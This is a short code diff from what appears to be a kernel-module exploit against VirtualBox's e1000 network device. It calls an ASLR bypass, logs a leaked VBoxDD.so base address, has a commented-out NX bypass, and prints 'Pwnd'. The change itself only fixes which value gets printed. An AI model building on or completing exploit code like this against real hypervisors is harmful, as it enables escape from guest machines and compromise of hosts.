@@ -62,7 +62,7 @@ static int __init e1k_init(void)
 	}
 	e1k_configure();
 	res = aslr_bypass();
-	pr_info("Leaked VBoxDD.so base : 0x%016llx\n", vboxdd_base);
+	pr_info("Leaked VBoxDD.so base : 0x%016llx\n", res);
 	//nx_bypass();
 	
 	pr_info("Pwnd");
